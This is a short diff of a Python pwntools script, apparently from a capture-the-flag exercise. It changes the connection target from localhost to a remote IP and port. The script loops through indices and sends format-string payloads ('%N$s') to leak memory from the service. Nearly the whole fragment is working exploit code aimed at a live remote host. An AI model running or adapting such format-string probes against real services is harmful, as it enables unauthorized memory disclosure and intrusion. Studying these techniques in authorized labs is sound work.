@@ -4,7 +4,7 @@ from pwn import *
 
 for i in range(100):
     try:
-        p = remote('127.0.0.1',60101)
+        p = remote('64.226.75.15',6010)
         p.recvline()
         p.clean()
         p.sendline('%{}$s'.format(i).encode())
